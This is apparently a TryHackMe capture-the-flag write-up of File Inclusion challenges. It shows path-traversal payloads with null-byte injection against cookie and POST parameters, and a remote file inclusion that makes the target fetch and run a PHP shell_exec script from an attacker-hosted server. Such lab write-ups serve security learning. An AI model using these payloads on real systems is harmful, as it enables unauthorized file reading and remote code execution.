# TryHackMe - File Inclusion Challenges Writeup:

## Introduction
This writeup documents my approach to capturing flags in the File Inclusion challenges, where I explored techniques for bypassing input sanitization and leveraging Local and Remote File Inclusion (LFI/RFI) vulnerabilities.

---

### **Flag 1**

**Objective:** Include `/etc/flag1` via a form method bypass.

**Solution:**  
The form’s default `GET` method blocked the file inclusion attempt. By changing the form method to `POST` or directly sending a crafted `POST` request, I set the `file` parameter to `/etc/flag1` and successfully retrieved the flag.

---

### **Flag 2**

**Objective:** Manipulate the `THM` cookie to access `/etc/flag2`.

**Solution:**  
1. Initially tried setting the cookie `THM=Admin` instead of `THM=Guest`, but this wasn’t sufficient.
2. Noticed that the file path was linked to the `THM` cookie value. I adjusted the cookie to `THM=../../../../etc/flag2`, but `.php` was automatically appended.
3. Bypassed this by injecting a null byte (`%00`) after the file path, resulting in `THM=../../../../etc/flag2%00`, which worked.

---

### **Flag 3**

**Objective:** Use a `POST` request to bypass input sanitization and include `/etc/flag3`.

**Solution:**  
1. The `GET` request had input sanitization that added slashes, so I switched to `POST`.
2. Manipulated the form action and method to allow both `.` and `/`.
3. Successfully used `file=../../../../etc/flag3%00` to retrieve the flag, with the null byte helping to bypass the appended `.php`.

---

### **Flag 4**

**Objective:** Perform Remote File Inclusion (RFI) to execute commands and retrieve the server’s hostname.

**Solution:**  
1. Created a PHP script (`cmd.txt`) to get the server’s hostname:
   ```php
   <?php
   // Execute the hostname command
   $hostname = shell_exec('hostname');
   echo "Hostname: " . trim($hostname);
   ?>
   ```
2. Hosted this file using Python’s HTTP server:
   ```bash
   python -m http.server
   ```
3. Included the file remotely via `/playground.php?file=http://YOURIP:PORT/cmd.txt`, successfully executing the `hostname` command and capturing Flag 4.
